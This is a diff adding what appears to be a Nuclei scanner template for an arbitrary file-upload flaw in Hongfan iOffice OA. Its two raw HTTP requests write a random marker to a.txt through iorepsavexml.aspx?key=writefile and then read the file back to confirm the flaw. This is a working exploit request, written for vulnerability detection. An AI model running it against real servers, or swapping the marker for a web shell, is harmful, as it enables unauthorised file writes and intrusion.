@@ -1,0 +1,33 @@
+id: HongfanOA-iorepsavexml-upload
+info:
+  name: HongfanOA-iorepsavexml-upload
+  author: known
+  severity: critical
+  description: 红帆oa文件上传
+  tags: ioffice
+  metadata:
+    verified: true
+http:
+
+  - raw:
+      - |              
+        POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=a.txt&filepath=/upfiles/rep/pic/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Length: 0
+
+        "{{randstr}}"
+        
+      - |+
+
+        GET /iOffice/upfiles/rep/pic/a.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+    matchers:
+      - type: word
+        words:
+          - "{{randstr}}"
+        part: body
